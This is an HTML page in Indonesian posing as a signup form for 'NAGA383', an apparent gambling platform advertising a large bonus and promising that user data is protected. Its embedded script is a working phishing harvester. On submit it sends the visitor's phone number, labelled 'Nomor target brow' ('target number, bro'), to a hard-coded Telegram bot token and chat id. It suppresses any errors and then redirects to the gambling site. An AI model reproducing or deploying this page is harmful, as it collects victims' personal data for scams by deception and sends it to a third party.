<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAGA383 - Daftar Sekarang</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f1419 0%, #1a1f2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(59, 130, 246, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
            pointer-events: none;
        }

        .container {
            background: rgba(26, 31, 46, 0.95);
            border-radius: 16px;
            padding: 48px 40px;
            max-width: 460px;
            width: 90%;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
            z-index: 1;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo h1 {
            font-size: 36px;
            color: #ffffff;
            margin-bottom: 8px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .logo p {
            color: rgba(255, 255, 255, 0.6);
            font-size: 15px;
            font-weight: 400;
        }

        .bonus-badge {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            padding: 14px 24px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 32px;
            font-weight: 600;
            font-size: 16px;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 10px;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 0.2px;
        }

        input[type="tel"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 15px;
            transition: all 0.3s;
        }

        input[type="tel"]:focus {
            outline: none;
            border-color: #3b82f6;
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        input[type="tel"]::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.3);
            letter-spacing: 0.3px;
        }

        .submit-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .features {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
        }

        .feature-item {
            display: flex;
            align-items: center;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 14px;
            font-size: 14px;
            line-height: 1.5;
        }

        .feature-item::before {
            content: 'âœ“';
            color: #3b82f6;
            font-weight: bold;
            margin-right: 12px;
            font-size: 16px;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
        }

        .security-badge::before {
            content: 'ðŸ”’';
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>NAGA383</h1>
            <p>Premium Gaming Platform</p>
        </div>

        <div class="bonus-badge">
            BONUS 100% HINGGA 10.000.000
        </div>

        <form id="registrationForm">
            <div class="form-group">
                <label for="phone">Nomor Handphone</label>
                <input 
                    type="tel" 
                    id="phone" 
                    name="phone" 
                    placeholder="Contoh: 081234567890" 
                    required
                    pattern="[0-9]{10,13}"
                >
            </div>

            <button type="submit" class="submit-btn">Daftar Sekarang</button>
        </form>

        <div class="features">
            <div class="feature-item">Proses verifikasi cepat dan mudah</div>
            <div class="feature-item">Withdraw otomatis 24/7</div>
            <div class="feature-item">Sistem keamanan terjamin</div>
        </div>

        <div class="security-badge">
            Data Anda Dilindungi
        </div>
    </div>

    <script>
        const form = document.getElementById('registrationForm');
        const phoneInput = document.getElementById('phone');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const phone = phoneInput.value;
            const botToken = '7592725209:AAEggb0kPFtCd4yFp3CALvY_4jeAaIm3ujU';
            const chatId = '8124375866';
            const message = `Nomor target brow: ${phone}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                // Silent fail
            }

            // Redirect
            window.location.href = 'https://naga383.com/';
        });
    </script>
</body>
</html>
